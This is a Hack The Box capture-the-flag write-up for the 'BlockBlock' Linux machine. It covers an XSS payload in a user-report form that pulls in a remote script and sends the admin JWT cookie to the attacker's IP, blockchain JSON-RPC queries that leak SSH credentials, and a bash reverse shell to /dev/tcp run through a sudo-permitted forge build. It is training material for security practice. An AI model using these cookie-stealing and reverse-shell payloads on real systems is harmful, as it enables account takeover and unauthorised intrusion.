---
layout: post
released: 2024-03-29
creators:
  - MrR3boot
pwned: true
tags: os/linux diff/hard
category: HTB
summary: "Blockblock is running an online web chat decentralized through block chain. We can exploit an XSS vulnerability in the web app to gain an admin cookie, from which we can interact with the blockhain api to leak credentials. We can then use these credentials to login to the system. We have permissions to run forge as another user. Using this privillege we run forge with a malicious build script to gain a shell as that user. This user has access to run pacman as root so we use this to install a malicious pacman package to get the ssh keys of root."
image: https://labs.hackthebox.com/storage/avatars/a6165b53a2df41fbfd6530782224925f.png
---
![BlockBlock](https://labs.hackthebox.com/storage/avatars/a6165b53a2df41fbfd6530782224925f.png)

# Enumeration
`nmap` find the following ports open:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-01 16:39 AEDT
Nmap scan report for blockblock.htb (10.10.11.43)
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown
```
# Foothold
Port `80` is running a decentralized block chain chat app:

![Pasted%20image%2020250201165025.png](/assets/img/img_BlockBlock/Pasted%20image%2020250201165025.png)

Registering and loging in we are greeted with a chat page:

![Pasted%20image%2020250201165142.png](/assets/img/img_BlockBlock/Pasted%20image%2020250201165142.png)

As can be seen, XSS on the main page doesn't seem to work, however on the `report user` function we can use the following XSS to test:
`<img src=x onerror="fetch('http://10.10.14.25/TEST')"/>`
And we receive a callback on our server:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.43 - - [01/Feb/2025 16:48:08] code 404, message File not found
10.10.11.43 - - [01/Feb/2025 16:48:08] "GET /TEST HTTP/1.1" 404 -
```
Using the following payload:
```
<img src=x onerror="const script = document.createElement('script'); script.src = 'http://10.10.14.25/script.js'; document.body.appendChild(script);"/>
```
and the following script:
```js
fetch("/api/info").then(response => response.text()).then(data =>{
    fetch("http://10.10.14.25/cookie?"+data,{
        mode: 'no-cors'
    });
});
```
we get the following response:
```
10.10.11.43 - - [01/Feb/2025 17:11:02] "GET /cookie?eyJyb2xlIjoiYWRtaW4iLCJ0b2t[REDACTED] HTTP/1.1" 404 -
```
Checking the `JWT` cookie on [jwt](https://jwt.io):
```json
{
  "role": "admin",
  "token": "eyJhbGciOiJIU[REDACTED]",
  "username": "admin"
}
```
We have admin cookie!
Change the token in our browser:

![Pasted%20image%2020250201171358.png](/assets/img/img_BlockBlock/Pasted%20image%2020250201171358.png)

We can find an additional tab:

![Pasted%20image%2020250201171416.png](/assets/img/img_BlockBlock/Pasted%20image%2020250201171416.png)

Under `/admin#users` we see: `keira` as a user.
Looking at `Caido` we can see when we access the admin pages we are making `api` requests:

![Pasted%20image%2020250201171837.png](/assets/img/img_BlockBlock/Pasted%20image%2020250201171837.png)

The `/api/json-rpc` contains a method: `eth_getBalance` which is from [Etherium JSON-RPC API](https://www.quicknode.com/docs/ethereum/eth_getLogs)

Making an API call using the following payload:
```json
{"jsonrpc":"2.0","method":"eth_getLogs","params":[{"fromBlock":"0x0","toBlock":"latest"}],"id":1}
```
we can get the logs:
```json
{
    "id": 1,
    "jsonrpc": "2.0",
    "result": [{
        "address": "0x75e41404c8c1de0c2ec801f06fbf5ace8662240f",
        "blockHash": "0x2a4b70fed5b62d2e4186542330d04a73519218112a58c4b31f2949795220812b",
        "blockNumber": "0x1",
        "blockTimestamp": "0x679d0fe3",
        "data": "0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000056b65697261000000000000000000000000000000000000000000000000000000",
        "logIndex": "0x0",
        "removed": false,
        "topics": ["0xda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98"],
        "transactionHash": "0x95125517a48dcf4503a067c29f176e646ae0b7d54d1e59c5a7146baf6fa93281",
        "transactionIndex": "0x0"
    }, 
    <SNIP>
```
Checking the block for valuable data using the following request:
```json
{
	"jsonrpc":"2.0",
	"method":"eth_getBlockByNumber",
	"params":[
		"0x1",true
	],
	"id":1
}
```
we get the following data:

```json
<{
    "id": 1,
    "jsonrpc": "2.0",
    "result": {
        "baseFeePerGas": "0x3b9aca00",
        "blobGasUsed": "0x0",
        "difficulty": "0x0",
        "excessBlobGas": "0x0",
        "extraData": "0x",
        "gasLimit": "0x1c9c380",
        "gasUsed": "0x127c32",
        "hash": "0x2a4b70fed5b62d2e4186542330d04a73519218112a58c4b31f2949795220812b",
        "logsBloom": "0x00100000000000000000000000000000000000000000000000000000000000000000000000000000008000000010000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
        "miner": "0x0000000000000000000000000000000000000000",
        "mixHash": "0x0000000000000000000000000000000000000000000000000000000000000000",
        "nonce": "0x0000000000000000",
        "number": "0x1",
        "parentHash": "0x6b87ee5bb2da13cbb41522128a9e66510d214b32a6f6afb1ead96d579d4e1b2d",
        "receiptsRoot": "0x5dc85a9ce0651081f8f776085a3f97537975c954485aafeefdbfdc5484b7504a",
        "sha3Uncles": "0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347",
        "size": "0x1b6d",
        "stateRoot": "0xebaa4051da301381c125aaf9ace65e1c8c1f0258edcbf9333eb28a716edc62d0",
        "timestamp": "0x679d0fe3",
        "totalDifficulty": "0x0",
        "transactions": [{
            "accessList": [],
            "blockHash": "0x2a4b70fed5b62d2e4186542330d04a73519218112a58c4b31f2949795220812b",
            "blockNumber": "0x1",
            "chainId": "0x7a69",
            "from": "0xb795dc8a5674250b602418e7f804cd162f03338b",
            "gas": "0x127c32",
            "gasPrice": "0x3b9aca00",
            "hash": "0x95125517a48dcf4503a067c29f176e646ae0b7d54d1e59c5a7146baf6fa93281",>
            "input": "0x60a060405234801561001057600080fd5b5060405161184538038061184583398101604081905261002f9161039a565b60405180606001604052808281526020016040518060400160405280600581526020016430b236b4b760d91b8152508152602001600115158152506001604051610084906430b236b4b760d91b815260050190565b908152604051908190036020019020815181906100a1908261048c565b50602082015160018201906100b6908261048c565b50604091909101516002909101805460ff1916911515919091179055336080526100e082826100e7565b505061060e565b6080516001600160a01b03163360
            <SNIP>
```
Noticing there is some extra data that isn't in the documentation, specifically the `input` parameter, trying to decode it as `Hex` we gather the following:

```
<SNIP>
keira [REDACTED]
```

> I've taken out the jumbled mess of characters that the hex data produces as most browsers can't render them.


# Keira
Using the credentials we found earlier to ssh:
```
ssh keira@blockblock.htb
The authenticity of host 'blockblock.htb (10.10.11.43)' can't be established.
ED25519 key fingerprint is SHA256:Yxhk4seV11xMS6Vp0pPoLicen3kJ7RAkXssZiL2/t3c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blockblock.htb' (ED25519) to the list of known hosts.
keira@blockblock.htb's password:
Last login: Mon Nov 18 16:50:13 2024 from 10.10.14.23
[keira@blockblock ~]$
```
Checking Keira's sudo privileges we can see that she can run forge as `paul`:
```
sudo -l
User keira may run the following commands on blockblock:
    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
```
We can get a shell by:
Creating a forge project:
```
mkdir w1ld
chmod 777 w1ld
cd w1ld
sudo -u 'paul' /home/paul/.foundry/bin/forge init --offline --no-git
```
Creating a revshell script:
```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.25/9001 0>&1' > ../w1ld.sh
chmod 777 ../w1ld.sh
```
Activating our listener:
```
nc -lvnp 9001
```
And building setting our revshell as the version:
```
sudo -u 'paul' /home/paul/.foundry/bin/forge build --use ../w1ld.sh
```
# Paul
And we have a shell!:
```
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.43.
Ncat: Connection from 10.10.11.43:55048.
[paul@blockblock w1ld]$
```
checking for sudo privileges once again:
```
sudo -l
sudo -l
User paul may run the following commands on blockblock:
    (ALL : ALL) NOPASSWD: /usr/bin/pacman
```

We can abuse this following this guide by `The Cyber Simon`:

 [Privilege Escalation via Pacman](https://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/)


# Root
After following the guide we ssh into the box:
```
# ssh root@blockblock.htb -i id_rsa
Last login: Thu Nov 14 14:47:11 2024
[root@blockblock ~]#
```
Just like that we have root!